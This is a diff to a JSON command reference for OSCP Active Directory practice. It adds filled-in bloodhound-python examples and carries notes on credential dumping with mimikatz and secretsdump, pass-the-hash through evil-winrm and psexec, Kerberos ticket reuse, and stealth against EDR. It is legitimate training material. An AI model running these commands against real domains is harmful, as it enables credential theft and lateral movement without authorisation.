@@ -18,7 +18,7 @@
     "attack_chain": [
       "1. Obtain valid AD credentials (password spraying, credential dump, etc.)",
       "2. Run bloodhound-python: bloodhound-python -u <USER> -p <PASS> -d <DOMAIN> -ns <DC_IP> -c All --zip",
-      "3. Transfer ZIP to BloodHound GUI: Click 'Upload Data' → select ZIP",
+      "3. Transfer ZIP to BloodHound GUI: Click 'Upload Data' \u2192 select ZIP",
       "4. Analyze attack paths in BloodHound",
       "5. Execute identified privilege escalation path"
     ],
@@ -96,7 +96,7 @@
         "No sessions collected": "Sessions require SMB enumeration which may need local admin. NOTE: bloodhound-python collects fewer sessions than SharpHound (can't access LSASS). Session data from bloodhound-python is limited to NetSessionEnum - less complete than SharpHound running ON target.",
         "SSL certificate errors": "LDAPS certificate validation failed. SOLUTION: Python SSL verification issue. Try without LDAPS first. If LDAPS required (channel binding), may need to trust DC certificate or disable verification (not recommended for prod, fine for OSCP labs)."
       },
-      "notes": "OSCP METHODOLOGY: bloodhound-python is your PRIMARY AD enumeration tool when you cannot deploy SharpHound on Windows.\n\nTIME ESTIMATE: 30 seconds to 5 minutes depending on domain size.\n\nWHEN TO USE:\n- You have credentials but no Windows shell\n- SharpHound blocked by AV/EDR\n- Prefer to work from Kali\n- Pass-the-hash scenario (use --hashes)\n\nWHEN TO USE SHARPHOUND INSTEAD:\n- You have Windows shell access\n- Need local admin session data (LoggedOn collection)\n- Large domain (SharpHound faster)\n- Need most complete data\n\nCOMPLETE WORKFLOW:\n1. Verify credentials work:\n   crackmapexec smb <DC_IP> -u <USER> -p <PASS>\n   \n2. Run bloodhound-python:\n   bloodhound-python -u '<USER>' -p '<PASS>' -d <DOMAIN> -ns <DC_IP> -c All --zip\n   \n3. Verify output:\n   ls -la *bloodhound.zip\n   unzip -l *bloodhound.zip  # Should contain: computers.json, users.json, groups.json, etc.\n   \n4. Upload to BloodHound GUI:\n   - Start Neo4j: sudo neo4j console\n   - Start BloodHound: bloodhound\n   - Click 'Upload Data' → select ZIP\n   \n5. Analyze paths:\n   - Search compromised user → Mark as Owned\n   - Run 'Shortest Paths to Domain Admins from Owned Principals'\n\nDATA COLLECTED (-c All):\n- users.json: All domain users with properties (admincount, pwdlastset, SPN, description)\n- groups.json: All groups with memberships\n- computers.json: All computers with OS, delegation settings\n- domains.json: Domain trusts and properties\n- gpos.json: Group Policy Objects\n- ous.json: Organizational Units\n- containers.json: AD containers\n\nDATA LIMITATIONS vs SharpHound:\n- No LSASS session data (LoggedOn)\n- Limited local admin enumeration (requires SMB access)\n- No scheduled task/service enumeration (Experimental in SharpHound)\n\nOUTPUT FILES:\n- Default: Individual JSON files in current directory\n- With --zip: Single YYYYMMDDHHMMSS_bloodhound.zip\n- Custom prefix: -op custom_ creates custom_*.json\n\nEXAM TIP: Always use --zip and verify ZIP contents before uploading. Corrupted or empty JSONs will cause BloodHound import failures.",
+      "notes": "OSCP METHODOLOGY: bloodhound-python is your PRIMARY AD enumeration tool when you cannot deploy SharpHound on Windows.\n\nTIME ESTIMATE: 30 seconds to 5 minutes depending on domain size.\n\nWHEN TO USE:\n- You have credentials but no Windows shell\n- SharpHound blocked by AV/EDR\n- Prefer to work from Kali\n- Pass-the-hash scenario (use --hashes)\n\nWHEN TO USE SHARPHOUND INSTEAD:\n- You have Windows shell access\n- Need local admin session data (LoggedOn collection)\n- Large domain (SharpHound faster)\n- Need most complete data\n\nCOMPLETE WORKFLOW:\n1. Verify credentials work:\n   crackmapexec smb <DC_IP> -u <USER> -p <PASS>\n   \n2. Run bloodhound-python:\n   bloodhound-python -u '<USER>' -p '<PASS>' -d <DOMAIN> -ns <DC_IP> -c All --zip\n   \n3. Verify output:\n   ls -la *bloodhound.zip\n   unzip -l *bloodhound.zip  # Should contain: computers.json, users.json, groups.json, etc.\n   \n4. Upload to BloodHound GUI:\n   - Start Neo4j: sudo neo4j console\n   - Start BloodHound: bloodhound\n   - Click 'Upload Data' \u2192 select ZIP\n   \n5. Analyze paths:\n   - Search compromised user \u2192 Mark as Owned\n   - Run 'Shortest Paths to Domain Admins from Owned Principals'\n\nDATA COLLECTED (-c All):\n- users.json: All domain users with properties (admincount, pwdlastset, SPN, description)\n- groups.json: All groups with memberships\n- computers.json: All computers with OS, delegation settings\n- domains.json: Domain trusts and properties\n- gpos.json: Group Policy Objects\n- ous.json: Organizational Units\n- containers.json: AD containers\n\nDATA LIMITATIONS vs SharpHound:\n- No LSASS session data (LoggedOn)\n- Limited local admin enumeration (requires SMB access)\n- No scheduled task/service enumeration (Experimental in SharpHound)\n\nOUTPUT FILES:\n- Default: Individual JSON files in current directory\n- With --zip: Single YYYYMMDDHHMMSS_bloodhound.zip\n- Custom prefix: -op custom_ creates custom_*.json\n\nEXAM TIP: Always use --zip and verify ZIP contents before uploading. Corrupted or empty JSONs will cause BloodHound import failures.",
       "oscp_relevance": "high",
       "tags": [
         "OSCP:HIGH",
@@ -111,16 +111,15 @@
       ],
       "prerequisites": [],
       "alternatives": [
-        "sharphound-collect-all",
-        "ldapsearch-users-ad",
-        "crackmapexec-ldap-bloodhound"
+        "ldapsearch-users-ad"
       ],
       "next_steps": [
         "bloodhound-upload-data",
         "bloodhound-analyze-paths",
         "impacket-getuserspns-kerberoast",
         "impacket-getnpusers-asreproast"
-      ]
+      ],
+      "filled_example": "bloodhound-python -u 'pete' -p 'Password123!' -d corp.com -ns 192.168.50.70 -c All --zip"
     },
     {
       "id": "bloodhound-python-dconly",
@@ -192,7 +191,8 @@
       "next_steps": [
         "bloodhound-upload-data",
         "bloodhound-python-all-collection"
-      ]
+      ],
+      "filled_example": "bloodhound-python -u 'pete' -p 'Password123!' -d corp.com -ns 192.168.50.70 -c DCOnly --zip"
     },
     {
       "id": "bloodhound-python-pth",
@@ -252,7 +252,7 @@
         "Authentication failed with valid hash": "Hash may be for wrong user or expired. Verify hash works: crackmapexec smb <DC_IP> -u <USER> -H <NT_HASH>. If CME works but bloodhound-python fails, try --auth-method ntlm to force NTLM.",
         "Kerberos errors with hash": "Bloodhound-python may try Kerberos first. Force NTLM: --auth-method ntlm. Or use -k with Kerberos ticket instead."
       },
-      "notes": "OSCP METHODOLOGY: Pass-the-Hash is FUNDAMENTAL technique. bloodhound-python fully supports PTH for AD enumeration.\n\nTIME ESTIMATE: Same as password auth (30s-5min).\n\nHASH SOURCES (OSCP scenarios):\n- Mimikatz: sekurlsa::logonpasswords → NTLM hash\n- SAM dump: secretsdump.py LOCAL → SAM hashes\n- NTDS.dit: secretsdump.py -ntds → All domain hashes\n- Cached creds: mimikatz lsadump::cache → DCC2 (need crack first)\n- Responder: NTLM relay captures → NetNTLMv2 (need crack first)\n\nHASH FORMAT:\n- LM:NT format required\n- LM hash usually empty: aad3b435b51404eeaad3b435b51404ee\n- NT hash is 32 hex characters\n- Example: aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86\n\nVERIFY HASH BEFORE USE:\ncrackmapexec smb <DC_IP> -u <USER> -H '<NT_HASH>'\n\nIf CME shows [+] (Pwn3d!), hash is valid and user has admin rights.\nIf CME shows [+] without Pwn3d, hash valid but user is not admin.\nIf CME shows [-], hash is invalid or expired.\n\nCOMBINE WITH OTHER PTH TOOLS:\nAfter bloodhound-python reveals attack path, use PTH for exploitation:\n- Evil-WinRM: evil-winrm -i <TARGET> -u <USER> -H <NT_HASH>\n- PSExec: impacket-psexec <DOMAIN>/<USER>@<TARGET> -hashes <LM>:<NT>\n- WMIExec: impacket-wmiexec <DOMAIN>/<USER>@<TARGET> -hashes <LM>:<NT>\n\nOSCP TIP: Always try PTH when you have hashes. Even if password cracking fails, PTH may succeed.",
+      "notes": "OSCP METHODOLOGY: Pass-the-Hash is FUNDAMENTAL technique. bloodhound-python fully supports PTH for AD enumeration.\n\nTIME ESTIMATE: Same as password auth (30s-5min).\n\nHASH SOURCES (OSCP scenarios):\n- Mimikatz: sekurlsa::logonpasswords \u2192 NTLM hash\n- SAM dump: secretsdump.py LOCAL \u2192 SAM hashes\n- NTDS.dit: secretsdump.py -ntds \u2192 All domain hashes\n- Cached creds: mimikatz lsadump::cache \u2192 DCC2 (need crack first)\n- Responder: NTLM relay captures \u2192 NetNTLMv2 (need crack first)\n\nHASH FORMAT:\n- LM:NT format required\n- LM hash usually empty: aad3b435b51404eeaad3b435b51404ee\n- NT hash is 32 hex characters\n- Example: aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86\n\nVERIFY HASH BEFORE USE:\ncrackmapexec smb <DC_IP> -u <USER> -H '<NT_HASH>'\n\nIf CME shows [+] (Pwn3d!), hash is valid and user has admin rights.\nIf CME shows [+] without Pwn3d, hash valid but user is not admin.\nIf CME shows [-], hash is invalid or expired.\n\nCOMBINE WITH OTHER PTH TOOLS:\nAfter bloodhound-python reveals attack path, use PTH for exploitation:\n- Evil-WinRM: evil-winrm -i <TARGET> -u <USER> -H <NT_HASH>\n- PSExec: impacket-psexec <DOMAIN>/<USER>@<TARGET> -hashes <LM>:<NT>\n- WMIExec: impacket-wmiexec <DOMAIN>/<USER>@<TARGET> -hashes <LM>:<NT>\n\nOSCP TIP: Always try PTH when you have hashes. Even if password cracking fails, PTH may succeed.",
       "oscp_relevance": "high",
       "tags": [
         "OSCP:HIGH",
@@ -264,8 +264,7 @@
         "ENUMERATION"
       ],
       "prerequisites": [
-        "mimikatz-sekurlsa-logonpasswords",
-        "secretsdump-local-sam"
+        "mimikatz-sekurlsa-logonpasswords"
       ],
       "alternatives": [
         "bloodhound-python-all-collection",
@@ -275,7 +274,8 @@
         "bloodhound-upload-data",
         "evil-winrm-pth",
         "impacket-psexec-pth"
-      ]
+      ],
+      "filled_example": "bloodhound-python -u 'pete' --hashes 'aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86' -d corp.com -ns 192.168.50.70 -c All --zip"
     },
     {
       "id": "bloodhound-python-kerberos",
@@ -318,7 +318,7 @@
         "KRB_AP_ERR_TKT_EXPIRED": "Ticket has expired (default 10 hours). SOLUTION: Request new ticket: impacket-getTGT <DOMAIN>/<USER>:<PASS>. Note ticket lifetime in output.",
         "KRB_AP_ERR_SKEW": "Time difference between Kali and DC too large (>5 min). SOLUTION: Sync time: sudo ntpdate <DC_IP> or timedatectl set-ntp true. Kerberos requires <5 minute time skew."
       },
-      "notes": "OSCP METHODOLOGY: Kerberos authentication is stealthier than NTLM and required for some attacks.\n\nTIME ESTIMATE: Same as password auth, plus ticket acquisition.\n\nWORKFLOW:\n1. Request TGT (if you have password):\n   impacket-getTGT corp.com/pete:'Password123!' -dc-ip 192.168.50.70\n   \n2. Set ccache:\n   export KRB5CCNAME=pete.ccache\n   \n3. Verify ticket:\n   klist\n   \n4. Run bloodhound-python:\n   bloodhound-python -k -d corp.com -ns 192.168.50.70 -c All --zip -no-pass\n\nTICKET SOURCES:\n- impacket-getTGT: Request with password or hash\n- Rubeus: Extract from Windows memory (ticket.kirbi → convert to ccache)\n- mimikatz: kerberos::list /export (ticket.kirbi → convert)\n- ticketConverter.py: Convert .kirbi to .ccache\n\nCONVERTING KIRBI TO CCACHE:\nimpacket-ticketConverter ticket.kirbi ticket.ccache\n\nTIME SYNC CRITICAL:\nKerberos requires time sync within 5 minutes. Before using -k:\nsudo ntpdate <DC_IP>\n\nWHY KERBEROS OVER NTLM:\n- Stealthier (Kerberos is expected AD traffic)\n- Required for certain attacks (delegation abuse)\n- May bypass NTLM restrictions (EPA, channel binding)\n\nOSCP TIP: If password known, use password auth (simpler). Kerberos auth mainly needed for Pass-the-Ticket scenarios or when NTLM blocked.",
+      "notes": "OSCP METHODOLOGY: Kerberos authentication is stealthier than NTLM and required for some attacks.\n\nTIME ESTIMATE: Same as password auth, plus ticket acquisition.\n\nWORKFLOW:\n1. Request TGT (if you have password):\n   impacket-getTGT corp.com/pete:'Password123!' -dc-ip 192.168.50.70\n   \n2. Set ccache:\n   export KRB5CCNAME=pete.ccache\n   \n3. Verify ticket:\n   klist\n   \n4. Run bloodhound-python:\n   bloodhound-python -k -d corp.com -ns 192.168.50.70 -c All --zip -no-pass\n\nTICKET SOURCES:\n- impacket-getTGT: Request with password or hash\n- Rubeus: Extract from Windows memory (ticket.kirbi \u2192 convert to ccache)\n- mimikatz: kerberos::list /export (ticket.kirbi \u2192 convert)\n- ticketConverter.py: Convert .kirbi to .ccache\n\nCONVERTING KIRBI TO CCACHE:\nimpacket-ticketConverter ticket.kirbi ticket.ccache\n\nTIME SYNC CRITICAL:\nKerberos requires time sync within 5 minutes. Before using -k:\nsudo ntpdate <DC_IP>\n\nWHY KERBEROS OVER NTLM:\n- Stealthier (Kerberos is expected AD traffic)\n- Required for certain attacks (delegation abuse)\n- May bypass NTLM restrictions (EPA, channel binding)\n\nOSCP TIP: If password known, use password auth (simpler). Kerberos auth mainly needed for Pass-the-Ticket scenarios or when NTLM blocked.",
       "oscp_relevance": "medium",
       "tags": [
         "OSCP:MEDIUM",
@@ -329,16 +329,15 @@
         "CCACHE",
         "ENUMERATION"
       ],
-      "prerequisites": [
-        "impacket-getTGT"
-      ],
+      "prerequisites": [],
       "alternatives": [
         "bloodhound-python-all-collection",
         "bloodhound-python-pth"
       ],
       "next_steps": [
         "bloodhound-upload-data"
-      ]
+      ],
+      "filled_example": "bloodhound-python -k -d corp.com -ns 192.168.50.70 -c All --zip -no-pass"
     },
     {
       "id": "bloodhound-python-specific-collection",
@@ -422,7 +421,8 @@
       ],
       "next_steps": [
         "bloodhound-upload-data"
-      ]
+      ],
+      "filled_example": "bloodhound-python -u 'pete' -p 'Password123!' -d corp.com -ns 192.168.50.70 -c Group,ACL,ObjectProps --zip"
     },
     {
       "id": "bloodhound-python-ldaps",
@@ -493,7 +493,8 @@
       ],
       "next_steps": [
         "bloodhound-upload-data"
-      ]
+      ],
+      "filled_example": "bloodhound-python -u 'pete' -p 'Password123!' -d corp.com -ns 192.168.50.70 --use-ldaps -c All --zip"
     },
     {
       "id": "bloodhound-python-computerfile",
@@ -568,7 +569,8 @@
       ],
       "next_steps": [
         "bloodhound-upload-data"
-      ]
+      ],
+      "filled_example": "bloodhound-python -u 'pete' -p 'Password123!' -d corp.com -ns 192.168.50.70 -c Session,LocalAdmin --computerfile targets.txt --zip"
     },
     {
       "id": "bloodhound-python-output-prefix",
@@ -617,7 +619,7 @@
       ],
       "failure_indicators": [],
       "troubleshooting": {},
-      "notes": "OSCP METHODOLOGY: Keep outputs organized for multi-machine exams.\n\nNAMING CONVENTION:\n-op oscp_machine1  → oscp_machine1_YYYYMMDDHHMMSS_bloodhound.zip\n-op corp_initial   → corp_initial_YYYYMMDDHHMMSS_bloodhound.zip\n-op after_creds    → after_creds_YYYYMMDDHHMMSS_bloodhound.zip\n\nOSCP EXAM ORGANIZATION:\nmkdir -p ~/oscp_exam/{ad_set1,ad_set2}\ncd ~/oscp_exam/ad_set1\nbloodhound-python ... -op ad_set1 --zip\n\nThis creates ad_set1_*_bloodhound.zip in the ad_set1 directory.",
+      "notes": "OSCP METHODOLOGY: Keep outputs organized for multi-machine exams.\n\nNAMING CONVENTION:\n-op oscp_machine1  \u2192 oscp_machine1_YYYYMMDDHHMMSS_bloodhound.zip\n-op corp_initial   \u2192 corp_initial_YYYYMMDDHHMMSS_bloodhound.zip\n-op after_creds    \u2192 after_creds_YYYYMMDDHHMMSS_bloodhound.zip\n\nOSCP EXAM ORGANIZATION:\nmkdir -p ~/oscp_exam/{ad_set1,ad_set2}\ncd ~/oscp_exam/ad_set1\nbloodhound-python ... -op ad_set1 --zip\n\nThis creates ad_set1_*_bloodhound.zip in the ad_set1 directory.",
       "oscp_relevance": "low",
       "tags": [
         "OSCP:LOW",
@@ -630,7 +632,8 @@
       "alternatives": [],
       "next_steps": [
         "bloodhound-upload-data"
-      ]
+      ],
+      "filled_example": "bloodhound-python -u 'pete' -p 'Password123!' -d corp.com -ns 192.168.50.70 -c All -op corp_exam --zip"
     }
   ]
 }
